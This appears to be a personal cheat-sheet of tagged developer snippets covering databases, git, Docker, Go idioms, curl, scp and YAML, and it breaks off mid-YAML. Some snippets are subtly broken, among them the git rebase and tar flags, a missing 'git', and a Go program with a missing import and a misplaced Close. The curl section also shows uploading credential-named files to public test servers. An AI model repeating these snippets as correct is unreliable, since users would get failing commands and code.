(tags: clickhouse client)
---

sudo apt install clickhouse-client
clickhouse-client
show tables
select * from mytablename order by ts_nano desc limit 1
==================================================
Influx client
(tags: influx client)
---

sudo apt install influxdb-client
influx
show databases
use grafana
show measurements
// show series
select * from mytablename limit 1
==================================================
Shutdown linux
(tags: shutdown linux)
---

sudo shutdown -h now
sudo shutdown -h 21:00
sudo shutdown -h +5 "Computer will be shutdown after 5 minutes"
sudo shutdown -c // cancel shutdown
==================================================
Get duplicate records in clickhouse
(tags: duplicate clickhouse)
---

select ts_nano, count(*) from mytablename group by ts_nano having count(*) > 1
==================================================
Git remove remote branch
(tags: git remove remote branch)
---

git
// see all upstreams in branches
git branch -vv
// remove branch on server
push origin --delete badbranchname
// upstream remote branch by local branch
git branch --set-upstream-to origin/goodbranchname
==================================================
Backup files in bash
(tags: bash backup zip)
---

//chmod +x /usr/sbin/backup

#!/bin/bash

PROJECTS_DIR="/home/username/projects"
NAME=backup_$(date +%Y_%m_%d_%H_%M)
START_TIME=$(date +%s)

mkdir /share/$NAME
cp -r $PROJECTS_DIR/project1 /share/$NAME/project1
cp -r $PROJECTS_DIR/project2 /share/$NAME/project2
cp -r $PROJECTS_DIR/project3 /share/$NAME/project3

cd /share

zip -r $NAME.zip $NAME > /dev/null

rm -r /share/$NAME

END_TIME=$(date +%s)
DIFF=$(( $END_TIME - $START_TIME))
FILE_SIZE=$(du -h /share/$NAME.zip)

echo "backup $FILE_SIZE was created in $DIFF s"
==================================================
Debugging golang code from terminal
(tags: debug terminal)
---

cd root/go/src/github.com/DimitryEf/experiment
vi main.go
  write the app (i) and save it (ESC :wq)
go run main.go
go get github.com/go-delve/delve/cmd/dlv
dlv debug
h
b main.main
b main.go:10
n
c
q
disass
==================================================
Postgresql json field
(tags: postgresql json field)
---

SELECT
  mt.jsonfield
FROM kso.mytable mt
WHERE mt.jsonfield->>'somefield' = 'somename'
==================================================
Postgresql json array
(tags: postgresql json array)
---

SELECT * FROM
(SELECT
  mt.name,
  json_array_elements(mt.jsonarray->'arrayname')->'jsonvalue' as jsonvalue
FROM mytable mt) t
WHERE t.jsonvalue::text = '\"somevalue\"'
==================================================
Postgresql loop
(tags: postgresql loop)
---

do $$
declare
  result_var text default '';
  counter int default 0;
begin
  result_var := 'qwe';
  drop table if exists tmp_qwe;
  create temp table tmp_qwe(result text);
  insert into tmp_qwe (result) values (result_var);
  loop

    counter := counter + 1;
    if counter = 5 then exit;
    end if;

    update tmp_qwe set result = result || counter::text;
  end loop;
end $$;

select * from tmp_qwe;
==================================================
Solve problems with using ebiten library
(tags: ebiten problem)
---

sudo apt-get install libglfw3 libglfw3-dev
sudo apt-get install libx11-dev
sudo apt install libxcursor-dev
sudo apt install libxtst-dev
sudo apt-get install libxcomposite-dev libxdamage-dev libxrender-dev
sudo apt-get install libxinerama-dev
sudo apt-get install libgl1-mesa-dev xorg-dev
==================================================
Debugging plugins
(tags: debug plugin)
---

// run debug with this flag
-gcflags="all=-N -l"
==================================================
Git squash commits
(tags: git squash)
---

1. specify the hash of the commit to which you need to squash other commits
git rebase -I dfs878
2. in the editor that opens, leave pick (or p) opposite the commit to which we squash everything (the first will fit, the last will not)
3. in other commits write squash (или s)
4. save the file
5. git merges commits and prompts you to choose a name
6. save the file
7. ready (you may check it with git log)
==================================================
Using postgresql in docker
(tags: postgresql docker)
---

docker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d -p 5432:5432 postgres
docker ps
docker exec -it 05b3a3471f6f bash
root@05b3a3471f6f:/# psql -U postgres
postgres-# CREATE DATABASE mytest;
postgres-# \q

// from localhost
psql -h public-ip-server -p 5432 -U postgres
==================================================
Dump postgresql to sqlite
(tags: dump postgresql sqlite)
---

package main

import (
  "context"
  "database/sql"
  "fmt"
  _ "github.com/lib/pq"
  _ "github.com/mattn/go-sqlite3"
  "log"
  "time"
)

func main() {
  dbname := "mydb"
  schema := "myschema"
  postgresqlConString := "user=myuser password=mypass dbname=mydb host=localhost port=5432 search_path=myschema sslmode=disable"
  sqliteConString := "mydb.db"
  log.SetFlags(log.LstdFlags | log.Lshortfile)
  t1 := time.Now()
  transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema)
  t := time.Since(t1)
  ms := t.Milliseconds()
  log.Printf("took time %d ms", ms)
}

func transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema string) {

  // connect to postgresql
  db, err := sql.Open("postgres", postgresqlConString)
  checkErr(err)
  ctx := context.Background()
  err = db.PingContext(ctx)
  checkErr(err)
  defer db.Close()

  // get all tables
  tables, err := db.QueryContext(ctx, "SELECT tablename FROM pg_tables WHERE schemaname = $1 ORDER BY tablename", schema)
  checkErr(err)
  defer tables.Close()

  // connect to sqlite, create file if not exists
  dbsqlite, err := sql.Open("sqlite3", sqliteConString)
  checkErr(err)
  defer db.Close()

  for tables.Next() {

    var tableName string
    tables.Scan(&tableName)
    log.Printf("table: %s", tableName)

    // get fields name and data type for current table
    fields, err := db.QueryContext(ctx, "SELECT column_name, data_type FROM information_schema.columns WHERE table_catalog = $1 AND table_schema = $2 AND table_name = $3 ORDER BY ordinal_position", dbname, schema, tableName)
    checkErr(err)

    // create table (do not drop table! because if table exists user must see this so as not to accidentally overwrite data)
    createTableString := buildCreateTableString(tableName, fields)
    _, err = dbsqlite.ExecContext(ctx, createTableString)
    checkErr(err)

    // get all rows from table
    rows, err := db.QueryContext(ctx, fmt.Sprintf("SELECT * FROM \"%s\".\"%s\"", check(schema), check(tableName))
    checkErr(err)
    columns, err := rows.Columns()
    checkErr(err)

    // start transaction
    tx, err := dbsqlite.Begin()
    checkErr(err)

    // prepare improves performance more than 600 times
    stmt, err := tx.Prepare(buildPrepareString(tableName, columns))
    checkErr(err)

    // prepare args as pointers
    args := make([]interface{}, len(columns))
    for i := range columns {
      args[i] = &sql.NullString{String: columns[i]}
    }

    // from postgresql to sqlite
    count := 0
    for rows.Next() {
      err := rows.Scan(args...)
      checkErr(err)
      _, err = stmt.Exec(args...)
      checkErr(err, args...)
      count++
    }
    log.Printf("\trows: %d", count)

    // commit transaction
    err = tx.Commit()
    checkErr(err)

    rows.Close()
    stmt.Close()
  }

}

func buildCreateTableString(tableName string, fields *sql.Rows) string {
  defer fields.Close()
  res := fmt.Sprintf("CREATE TABLE \"%s\" (", tableName)
  for fields.Next() {
    var field, dataType string
    err := fields.Scan(&field, &dataType)
    checkErr(err)
    res += fmt.Sprintf("\n\t\"%s\"\t%s,", field, convertType(dataType))
    log.Printf("\tcolumn: %s", field)
  }
  res = res[:len(res)-1]
  res += "\n)"
  return res
}

func convertType(dataType string) string {
  switch dataType {
  case "\"char\"", "character varying", "date", "text":
    return "TEXT"
  case "bigint", "boolean", "integer", "smallint":
    return "INTEGER"
  case "double precision", "numeric", "real":
    return "REAL"
  case "bytea":
    return "BLOB"
  default:
    return "TEXT"
  }
}

func check(s string) string {
  if strings.Contains(s, "\"") {
    log.Fatalf("bad char in \"%s\"", s)
  }
  return s
}

func checkErr(err error, args ...interface{}) {
  if err != nil {
    log.Fatalf("%q: %s", err, args)
  }
}

func buildPrepareString(tableName string, columns []string) string {
  res := fmt.Sprintf("INSERT INTO \"%s\" (", tableName)
  count := 0
  for _, col := range columns {
    res += fmt.Sprintf("\"%s\",", col)
    count++
  }
  res = res[:len(res)-1]
  res += ") VALUES ("
  for i := 0; i < count; i++ {
    res += "?,"
  }
  res = res[:len(res)-1]
  res += ")"
  return res
}
==================================================
Graceful shutdown
(tags: graceful shutdown)
---

func action(c *cli.Context) error {
  startTime := time.Now()

  finish := make(chan struct{})

  ctx, cancel := context.WithCancel(context.Background())
  go act(ctx, finish)
  defer cancel()

  go gracefulShutdown(finish, cancel)

  <-finish
  endTime := time.Since(startTime)
  ms := endTime.Milliseconds()
  log.Printf("took time: %d ms", ms)

  return nil
}

func gracefulShutdown(finish chan<- struct{}, cancel context.CancelFunc) {
  interrupt := make(chan os.Signal, 1)
  signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)

  <-interrupt

  log.Printf("interrupted, sql queries will be canceled in 3 seconds")
  cancel()
  time.Sleep(3 * time.Second)
  defer func() {
    finish <- struct{}{}
  }()
}
==================================================
Goland hotkeys
(tags: hotkeys goland)
---

alt+j - select the same words
shift+enter = start new line (open file in split right)
ctrl+alt+enter - start new line before current
ctrl+w - extend selection
ctrl+shift+w - shrink selection
ctrl+shift+u - toggle case
ctrl+alt+shift+lmb (left mouse) - multiselect
ctrl+[ - move to code block start
ctrl+] - move to code block end
ctrl+shift+[ - move to code block start with select
ctrl+shift+] - move to code block end with select
ctrl+y - delete line
ctrl+delete - delete to word end
ctrl+backspace - delete to word start
ctrl+d - duplicate line or selection (compare files)
ctrl+shift+j - join lines
ctrl+shift+m - move to matching brace
ctrl+shift+insert - column selection mode
tab - next parameter
shift+tab - prev parameter
f2 - next highlight editor
shift+f2 - prev highlight editor
ctrl+alt+left - back
ctrl+alt+right - forward
ctrl+n - go to type
ctrl+shift+n - go to file
ctrl+b - go to declaration or usage
ctrl+alt+b - go to implementation
ctrl+shift+b - go to type declaration
ctrl+shift+t go to test
ctrl+f12 - file structure
ctrl+alt+shift+2 - file path
ctrl+h - type hierarchy
ctrl+shift+h - method hierarchy
ctrl+alt+h - call hierarchy
ctrl+/ - comment code
ctrl+shift+/ - comment block
ctrl+alt+l - reformat code
ctrl+alt+shift+l - reformat file
ctrl+shift+down - move statement down
ctrl+shift+up - move statement up
ctrl+alt+shif+left - move element left
ctrl+alt+shif+right - move element right
alt+shift+down - move line down
alt+shift+up - move line up
shift+f6 - rename (edit changelist)
ctrl+f6 - change signature
ctrl+alt+m - extract method
ctrl+alt+n - inline
shift+f10 - run
shift+f9 - debug
ctrl+f2 - stop
f8 - step over
f7 - step into
shift+f8 - step out
alt+shift+9 - run to cursor
f9 - resume
ctrl+alt+shift+p - go fmt project
ctrl+alt+g - go generate file
alt+0 - commit window
alt+1 - project window
alt+2 - favorites window
alt+3 - find window
alt+4 - run window
alt+5 - debug window
alt+6 - problems window
alt+7 - structure window
alt+8 - services window
alt+9 - git window
alt+f12 - terminal window
ctrl+k - commit
ctrl+shift+k - push
ctrl+t - update project
ctrl+alt+shift+down - next change
ctrl+alt+shift+up - prev change
ctrl+alt+a - add to git
ctrl+shift+g - go file (my setting)
==================================================
Backup postgresql and restore it in docker
(tags: backup postgresql docker)
---

pg_dump -h 192.168.0.2 -d mydb -p 5432 -U myuser > /temp/mydb.dump
docker cp /temp/mydb.dump my-pg-container:/home/mydb.dump
docker exec -it my-pg-container bash
// dropdb -U postgres 'mydb'
// psql
// \l
// CREATE DATABASE mydb WITH ENCODING='UTF-8';
// \du
// \q
// create role myuser superuser
psql -U postgres mydb < /home/mydb.dump
\\ \c
\\ \dt
\\ select * from pg_catalog.pg_tables;
==================================================
Git push tag
(tags: git tag)
---

// add tag to commit
git tag -a 1.0.2 e50f795
// one tag
git push origin v1.0.0
// many tags
git push origin --tags
// remove tag
git push origin :v1.0.0
// show tag
git show v1.0.0
==================================================
Linux tar, gzip, zip, unzip
(tags: linux tar gzip zip unzip)
---

tar -cf archive.tar foo bar    # Create archive.tar from files foo and bar.
tar -cfz archive.tar.gz foodir # Create archive.tar.gz from dir with gzip compress.
tar -tvf archive.tar           # List all files in archive.tar verbosely.
tar -xf archive.tar            # Extract all files from archive.tar.
tar -xzvf foo.tar.gz dir/sdir  # Extract subdir
  -c # Create new archive
  -f # Name of archive
  -t # List all files in in archive
  -v # Verbosely list files processed
  -z # Use gzip
  -j # Use bzip2
# by size: dir.tar.gz < dir < dir.tar

unzip archive.zip
unzip -tq archive.zip      # Test archive for errors
unzip archive.zip -d /tmp  # Extract into some dir
unzip -l archive.zip       # List of entry files

gzip file.log      # Create archive file.log.gz
gunzip archive.gz  # Unpack archive

zip --encrypt secure.zip file  # Create archive with password
Enter password:
Verify password:
# Create archive.zip with max compress (-9) exclude folder "/var/log/apt/*"
zip -r -9 archive.zip /var/log/* /var/spool/* -x "/var/log/apt/*"
==================================================
Table test
(tags: table test)
---

func TestConvertQueryToTopic(t *testing.T) {
  type args struct {
    query string
  }
  tests := []struct {
    name string
    args args
    want Topic
  }{
    {
      name: "simple",
      args: args{query: "Extract beginning of string (prefix)\n(tags: extract beginning string prefix)\n---\n\nt := string([]rune(s)[:5])"},
      want: Topic{
        Title:   "Extract beginning of string (prefix)",
        Code:    "t := string([]rune(s)[:5])",
        Checked: false,
        Tags: []Tag{
          {Name: "extract"},
          {Name: "beginning"},
          {Name: "string"},
          {Name: "prefix"},
        },
      },
    },
  }
  for _, tt := range tests {
    t.Run(tt.name, func(t *testing.T) {
      if got, _ := ConvertQueryToTopic(tt.args.query); !reflect.DeepEqual(got, tt.want) {
        t.Errorf("ConvertQueryToTopic() = %v, want %v", got, tt.want)
      }
    })
  }
}
==================================================
Types in MySQL, PostgreSQL, SQLite
(tags: type mysql postgresql sqlite)
---

https://stackoverflow.com/questions/1942586/comparison-of-database-column-types-in-mysql-postgresql-and-sqlite-cross-map

MySQL               PostgreSQL          SQLite

TINYINT             SMALLINT            INTEGER
SMALLINT            SMALLINT
MEDIUMINT           INTEGER
BIGINT              BIGINT
BIT                 BIT                 INTEGER
___________________________________________________

TINYINT UNSIGNED    SMALLINT            INTEGER
SMALLINT UNSIGNED   INTEGER
MEDIUMINT UNSIGNED  INTEGER
INT UNSIGNED        BIGINT
BIGINT UNSIGNED     NUMERIC(20)
___________________________________________________

DOUBLE              DOUBLE PRECISION    REAL
FLOAT               REAL                REAL
DECIMAL             DECIMAL             REAL
NUMERIC             NUMERIC             REAL
___________________________________________________

BOOLEAN             BOOLEAN             INTEGER
___________________________________________________

DATE                DATE                TEXT
TIME                TIME
DATETIME            TIMESTAMP
___________________________________________________

TIMESTAMP DEFAULT   TIMESTAMP DEFAULT   TEXT
NOW()               NOW()
___________________________________________________

LONGTEXT            TEXT                TEXT
MEDIUMTEXT          TEXT                TEXT
BLOB                BYTEA               BLOB
VARCHAR             VARCHAR             TEXT
CHAR                CHAR                TEXT
___________________________________________________

columnname INT      columnname SERIAL   INTEGER PRIMARY
AUTO_INCREMENT                          KEY AUTOINCREMENT
==================================================
SQLite syntax
(tags: sqlite syntax)
---

CREATE TABLE test (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    model TEXT
);
INSERT INTO test (id, model) VALUES (7, 'a')
INSERT INTO test (id, model) VALUES (2, 'ab')
INSERT INTO test (model) VALUES ('abc')
SELECT ROWID, id, model FROM test
  2 2 ab
  7 7 a
  8 8 abc
// and the same without AUTOINCREMENT

CREATE VIEW model_names AS
  SELECT model || '_' || id
  FROM test

CREATE TEMP TABLE tmp_1 (name TEXT)

// aggregate functions
AVG    Return the average value of non-null values in a group
COUNT  Return the total number of rows in a table.
MAX    Return the maximum value of all values in a group.
MIN    Return the minimum value of all values in a group.
SUM    Return the sum of all non-null values in a column
GROUP_CONCAT  Concatenate non-null values in a column

// string functions
SUBSTR  Extract and returns a substring with a predefined length starting at a specified position in a source string
TRIM    Return a copy of a string that has specified characters removed from the beginning and the end of a string.
LTRIM   Return a copy of a string that has specified characters removed from the beginning of a string.
RTRIM   Return a copy of a string that has specified characters removed from the end of a string.
LENGTH  Return the number of characters in a string or the number of bytes in a BLOB.
REPLACE Return a copy of a string with each instance of a substring replaced by the other substring.
UPPER   Return a copy of a string with all of the characters converted to uppercase.
LOWER   Return a copy of a string with all of the characters converted to lowercase.
INSTR   Find a substring in a string and returns an integer indicating the position of the first occurrence of the substring.

// control flow functions
COALESCE  Return the first non-null argument
IFNULL    Provide the NULL if/else construct
IIF       Add if-else logic to queries - IIF(expression, true_expression, false_expression).
NULLIF    Return NULL if the first argument is equal to the second argument.

// date and time functions
DATE       Calculate the date based on multiple date modifiers.
TIME       Calculate the time based on multiple date modifiers.
DATETIME   Calculate the date & time based on one or more date modifiers.
JULIANDAY  Return the Julian day, which is the number of days since noon in Greenwich on November 24, 4714 B.C.
STRFTIME   Format the date based on a specified format string.

// math functions
ABS     Return the absolute value of a number
RANDOM  Return a random floating-point value between the minimum and maximum integer values
ROUND   Round off a floating value to a specified precision.
==================================================
Copy files over SSH
(tags: copy file ssh)
---

https://www.shellhacks.com/copy-files-ssh-10-examples/

// Example 1: Copy the file “file.txt” from a remote host to the local host.
scp user@remote.host:file.txt /some/local/directory
// Example 2: Copy the file “file.txt” from the local host to a remote host.
scp file.txt user@remote.host:/some/remote/directory
// Example 3: Copy the directory “dir1” from the local host to a remote host’s directory “dir2”.
scp -r dir1 user@remote.host:/some/remote/directory/dir2
// Example 4: Copy the file “file.txt” from remote host “remote.host1” to remote host “remote.host2”.
scp user@remote.host1:/directory/file.txt user@remote.host2:/some/directory/
// Example 5: Copy the files “file1.txt” and “file2.txt” from the local host to your home directory on the remote host.
scp file1.txt file2.txt user@remote.host:~
// Example 6: Copy the file “file.txt” from the local host to a remote host using port 2222.
scp -P 2222 file.txt user@remote.host:/some/remote/directory
// Example 7: Copy the file “file.txt” from the local host to a remote host’s home directory. Preserve the modification and access times, as well as the permissions of the source-file in the destination-file.
scp -p file.txt user@remote.host:~
// Example 8: Copy the file “file.txt” from the local host to a remote host’s home directory. Increase SCP speed by changing the cipher from the default AES-128 to Blowfish.
scp -c blowfish file.txt user@remote.host:~
// Example 9: Copy the file “file.txt” from the local host to a remote host’s home directory. limit the bandwidth used by SCP command to 100 Kbit/s.
scp -l 100 file.txt user@remote.host:~
// Example 10: Copy multiple files from the remote host to your current directory on the local host.
scp user@remote.host:~/\{file1,file2,file3\} .
==================================================
Linux telnet
(tags: linux telnet)
---

// check server available
telnet 192.168.1.243
// check port available
telnet localhost 123
// debug mode with more info
telnet -d localhost 22
// show telnet commands
// Ctrl+[
// telnet>
status
// GET
telnet opennet.ru 80
GET /
==================================================
Linux curl
(tags: linux curl)
---

// Downloat file and show it in output
curl https://raw.githubusercontent.com/curl/curl/master/README.md
// Download into file
curl -o readme.txt https://raw.githubusercontent.com/curl/curl/master/README.md
// Save with the same name (README.md)
curl -O https://raw.githubusercontent.com/curl/curl/master/README.md
// Restore downloading after interrupt
curl -# -C - -O https://cdn.kernel.org/pub/linux/kernel/v4.x/testing/linux-4.11-rc7.tar.xz
// Download many files
curl -O https://raw.githubusercontent.com/curl/curl/master/README.md -O https://raw.githubusercontent.com/curl/curl/master/README
// Download file if id has been modified
curl -z 21-Dec-17 https://raw.githubusercontent.com/curl/curl/master/README.md
// Limit download speed
curl --limit-rate 50K -O https://cdn.kernel.org/pub/linux/kernel/v4.x/testing/linux-4.11-rc7.tar.xz
// Close connection if speed less than needed
curl -Y 100 -O https://raw.githubusercontent.com/curl/curl/master/README.md
// Send file to ftp server
curl -T login.txt ftp://speedtest.tele2.net/upload/
// Show where ftp server saved our file
curl -T ~/login.txt http://posttestserver.com/post.php
// POST
curl -d "field1=val&fileld2=val1" http://posttestserver.com/post.php
// Form POST
curl -F "password=@pass;type=text/plain" http://posttestserver.com/post.php
// Save cookie in file
curl -c cookie.txt http://posttestserver.com/post.php
// Send cookie from file to server
curl -b cookie.txt http://posttestserver.com/post.php
// Show headers
curl -I https://losst.ru
// Set header to request
curl -I --header 'If-Modified-Since: Mon, 26 Dec 2016 18:13:12 GMT' https://losst.ru
// Using auth
curl -u ftpuser:ftppass -T - ftp://ftp.testserver.com/myfile_1.txt
// Using proxy
curl -x proxysever.test.com:3128 http://google.co.in
// Send json
curl -H "Content-Type: application/json" \
  -X POST \
  -d '{"username":"xyz","password":"xyz"}' \
  http://localhost:3000/api/login
==================================================
Elasticsearch in docker
(tags: elasticsearch docker)
---

https://www.freecodecamp.org/news/go-elasticsearch/

// Run in docker
docker run -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" docker.elastic.co/elasticsearch/elasticsearch:7.10.1
// Create index
curl -H "Content-Type: application/json" -X PUT -d '{ "settings": {"number_of_shards": 1, "number_of_replicas": 1 }, "mappings": { "properties": { "name": { "type": "text" }, "age": { "type": "integer" }, "average_score": { "type": "float" }} } }'   http://localhost:9200/students

// main.go for insert data
package main

import (
  "context"
  "encoding/json"
  "fmt"
  "gopkg.in/olivere/elastic.v7"
)

type Student struct {
  Name         string  `json:"name"`
  Age          int64   `json:"age"`
  AverageScore float64 `json:"average_score"`
}

func GetESClient() (*elastic.Client, error) {
  client, err :=  elastic.NewClient(elastic.SetURL("http://localhost:9200"),
    elastic.SetSniff(false),
    elastic.SetHealthcheck(false))

  fmt.Println("ES initialized...")
  return client, err
}

func main() {
  ctx := context.Background()
  esclient, err := GetESClient()
  if err != nil {
    fmt.Println("Error initializing : ", err)
    panic("Client fail ")
  }

  //creating student object
  newStudent := Student{
    Name:         "Gopher doe",
    Age:          10,
    AverageScore: 99.9,
  }

  dataJSON, err := json.Marshal(newStudent)
  js := string(dataJSON)
  _, err = esclient.Index().
    Index("students").
    BodyJson(js).
    Do(ctx)

  if err != nil {
    panic(err)
  }
  fmt.Println("[Elastic][InsertProduct]Insertion Successful")
}

// Find matched
curl -H "Content-Type: application/json" -X POST -d '{"query":{"match":{"name":"doe"}}}' http://localhost:9200/students/_search

// main.go for search data
package main

import (
  "context"
  "encoding/json"
  "fmt"
  elastic "gopkg.in/olivere/elastic.v7"
)

func main() {
  ctx := context.Background()
  esclient, err := GetESClient()
  if err != nil {
    fmt.Println("Error initializing : ", err)
    panic("Client fail ")
  }

  var students []Student

  searchSource := elastic.NewSearchSource()
  searchSource.Query(elastic.NewMatchQuery("name", "Doe"))

  /* this block will basically print out the es query */
  queryStr, err1 := searchSource.Source()
  queryJs, err2 := json.Marshal(queryStr)

  if err1 != nil || err2 != nil {
    fmt.Println("[esclient][GetResponse]err during query marshal=", err1, err2)
  }
  fmt.Println("[esclient]Final ESQuery=\n", string(queryJs))
    /* until this block */

  searchService := esclient.Search().Index("students").SearchSource(searchSource)

  searchResult, err := searchService.Do(ctx)
  if err != nil {
    fmt.Println("[ProductsES][GetPIds]Error=", err)
    return
  }

  for _, hit := range searchResult.Hits.Hits {
    var student Student
    err := json.Unmarshal(hit.Source, &student)
    if err != nil {
      fmt.Println("[Getting Students][Unmarshal] Err=", err)
    }

    students = append(students, student)
  }

  if err != nil {
    fmt.Println("Fetching student fail: ", err)
  } else {
    for _, s := range students {
      fmt.Printf("Student found Name: %s, Age: %d, Score: %f \n", s.Name, s.Age, s.AverageScore)
    }
  }
}
==================================================
Anonymous structs for template data
(tags: anonymous struct template)
---

https://talks.golang.org/2015/tricks.slide

package main

import (
  "log"
  "os"
  "text/template"
)

func main() {
  data := struct {
    FirstName string
    LastName string
  }{
    "John",
    "Doe",
  }
  tmpl := template.Must(template.New("name").Parse("Hello, {{.FirstName}} {{.LastName}}!"))
  if err := tmpl.Execute(os.Stdout, data); err != nil {
    log.Fatal(err)
  }
}
==================================================
Anonymous structs for json
(tags: anonymous struct json)
---

https://talks.golang.org/2015/tricks.slide

// encoging from struct to json
b, err := json.Marshal(struct {
    ID   int
    Name string
}{42, "The answer"})
if err != nil {
    log.Fatal(err)
}
fmt.Printf("%s\n", b)

// decoding ftom json to struct
var data struct {
    ID     int
    Person struct {
        Name string
        Job  string
    }
}
const s = `{"ID":42,"Person":{"Name":"George Costanza","Job":"Architect"}}`
err := json.Unmarshal([]byte(s), &data)
if err != nil {
    log.Fatal(err)
}
fmt.Println(data.ID, data.Person.Name, data.Person.Job)
==================================================
Anonymous structs with embedded mutex
(tags: anonymous struct embedded mutex)
---

https://talks.golang.org/2015/tricks.slide

var viewCount struct {
    sync.Mutex
    n int64
}

viewCount.Lock()
viewCount.n++
viewCount.Unlock()
==================================================
Anonymous structs with implementing interfaces
(tags: anonymous struct implement interface)
---

https://talks.golang.org/2015/tricks.slide

return struct {
    io.ReadSeeker
    io.Closer
}{
    io.NewSectionReader(strings.NewReader(s), 0, int64(len(s))),
    ioutil.NopCloser(nil),
}
==================================================
Anonymous interfaces
(tags: anonymous interface)
---

https://talks.golang.org/2015/tricks.slide

var s interface {
        String() string
    } = bytes.NewBufferString("I'm secretly a fmt.Stringer!")
    fmt.Println(s.String())

// or
// Check that we can access methods of the underlying os.File.
if _, ok := stdin.(interface {
    Fd() uintptr
}); !ok {
    t.Error("can't access methods of underlying *os.File")
}
==================================================
Method values
(tags: method value)
---

https://talks.golang.org/2015/tricks.slide

// Evaluating a method from a type yields a function:
var f func(*bytes.Buffer, string) (int, error)
var buf bytes.Buffer
f = (*bytes.Buffer).WriteString
f(&buf, "y u no buf.WriteString?")
buf.WriteTo(os.Stdout)

// Evaluating a method from a value creates a closure that holds that value:
var f func(string) (int, error)
var buf bytes.Buffer
f = buf.WriteString
f("Hey... ")
f("this *is* cute.")
buf.WriteTo(os.Stdout)
==================================================
Using sync.Once
(tags: sync once)
---

https://talks.golang.org/2015/tricks.slide

// Once is an object that will perform exactly one action.
// type Once struct { /* Has unexported fields. */ }
// func (o *Once) Do(f func())

type LazyPrimes struct {
    once   sync.Once // Guards the primes slice.
    primes []int
}

func (p *LazyPrimes) init() {
    // Populate p.primes with prime numbers.
}

func (p *LazyPrimes) Primes() []int {
    p.once.Do(p.init)
    return p.primes
}
==================================================
Comparable types
(tags: comparable type)
---

https://talks.golang.org/2015/tricks.slide

// Bools, ints, floats, complex numbers, strings, pointers,
// channels, structs, and interfaces are comparable.

var a, b int = 42, 42
fmt.Println(a == b) // true

var i, j interface{} = a, b
fmt.Println(i == j) // true

var s, t struct{ i interface{} }
s.i, t.i = a, b
fmt.Println(s == t) // true

// A struct is comparable only if its fields are comparable:
var q, r struct{ s []string }
fmt.Println(q == r) // build failed
==================================================
Map keys
(tags: map key)
---

https://talks.golang.org/2015/tricks.slide

// Any comparable type may be used as a map key.

a := map[int]bool{}
a[42] = true

type T struct {
    i int
    s string
}

b := map[*T]bool{}
b[&T{}] = true

c := map[T]bool{}
c[T{37, "hello!"}] = true

d := map[interface{}]bool{}
d[42] = true
d[&T{}] = true
d[T{123, "four five six"}] = true
d[ioutil.Discard] = true


// Interfaces as map keys
// An example of interface map keys from Docker's broadcastwriter package:

type BroadcastWriter struct {
    sync.Mutex
    writers map[io.WriteCloser]struct{}
}

func (w *BroadcastWriter) AddWriter(writer io.WriteCloser) {
    w.Lock()
    w.writers[writer] = struct{}{}
    w.Unlock()
}

func (w *BroadcastWriter) Write(p []byte) (n int, err error) {
    w.Lock()
    for sw := range w.writers {
        if n, err := sw.Write(p); err != nil || n != len(p) {
            delete(w.writers, sw)
        }
    }
    w.Unlock()
    return len(p), nil
}

// Structs and interfaces together as map keys
// A (very) contrived example: (Don't do this! Ever!)

type cons struct {
    car string
    cdr interface{}
}

func (c cons) String() string {
    if c.cdr == nil || c.cdr == (cons{}) {
        return c.car
    }
    return fmt.Sprintf("%v %v", c.car, c.cdr)
}

func main() {
    m := map[cons]string{}
    c := cons{}
    for _, s := range []string{"life?", "with my", "I doing", "What am"} {
        c = cons{s, c}
    }
    m[c] = "No idea."
    fmt.Println(c, m[c])
}
==================================================
Using atomic.Value
(tags: atomic value)
---

https://talks.golang.org/2015/tricks.slide

// For instance, to share configuration between many goroutines:
type Config struct {
    Timeout time.Duration
}
var config atomic.Value

// To set or update, use the Store method:
config.Store(&Config{Timeout: 2*time.Second})

// To read, each goroutine calls the Load method:
// Note that storing different types in the same Value will cause a panic.
cfg := config.Load().(*Config)
==================================================
Running Gitlab in docker container
(tags: gitlab docker)
---

// add some host to /etc/hosts
nano /etc/hosts
127.0.0.1 myagitlab.com

// run container
docker run --detach \
  --hostname mygitlab.com \
  --publish 443:443 --publish 8880:80 --publish 22:22 \
  --name gitlab \
  --restart always \
  --volume $GITLAB_HOME/config:/etc/gitlab \
  --volume $GITLAB_HOME/logs:/var/log/gitlab \
  --volume $GITLAB_HOME/data:/var/opt/gitlab \
  gitlab/gitlab-ee:latest

// wait and try mygitlab.com:8880
==================================================
Reading gzipped HTTP response
(tags: gzip http)
---

https://stackoverflow.com/questions/13130341/reading-gzipped-http-response-in-go

client := new(http.Client)

request, err := http.NewRequest("GET", "http://stackoverflow.com", nil)
request.Header.Add("Accept-Encoding", "gzip")

response, err := client.Do(request)
defer response.Body.Close()

// Check that the server actually sent compressed data
var reader io.ReadCloser
switch response.Header.Get("Content-Encoding") {
case "gzip":
    reader, err = gzip.NewReader(response.Body)
    defer reader.Close()
default:
    reader = response.Body
}

io.Copy(os.Stdout, reader) // print html to standard out
==================================================
Yaml syntax
(tags: yaml syntax)
---

https://alingvo.ru/help-ru/yml

--- # Movie list: block sequence
- Casablanca
- Spellbound
- Notorious
--- # Shopping list: one-line sequence
[milk, bread, eggs, juice]

--- # Block format
name: John Smith
age: 33
--- # Single line format
{name: John Smith, age: 33}

# Block literals (line feeds are preserved):
--- |
  There was a young fellow of Warwick
  Who had reason for feeling euphoric
      For he could, by election
      Have triune erection
  Ionic, Corinthian, and Doric

# Block literals (line feeds are ignored):
--- >
  Wrapped text
  will be folded
  into a single
  paragraph

  Blank lines denote
  paragraph breaks

# Sequences from maps:
- {name: John Smith, age: 33}
- name: Mary Smith
  age: 27

# Maps from sequences:
men: [John Smith, Bill Jones]
women:
  - Mary Smith
  - Susan Williams

https://webdevblog.ru/yaml-dlya-veb-razrabotchikov/

# json
{
  "company": "Google",
  "full_name": "John Foo Bar Doe",
  "name": "John",
  "surname": "Christian Meyer"
}
# yaml
company: Google             # Single words, no quotes
full_name: John Foo Bar Doe # Full sentence, no quotes
name: 'John'                # Using single quotes
surname: "Christian Meyer"  # Using double quotes

year: 2019 # Integer
nodeVersion: 10.8 # Float

#json
{
  "production": {
    "node_version": "13.0.0",
    "os": "ubuntu",
    "package_manager": "yarn",
    "run": ["yarn install", "NODE_ENV=${ENVIRONMENT} yarn build"],
    "env": {
      "ENVIRONMENT": "production"
    }
  },
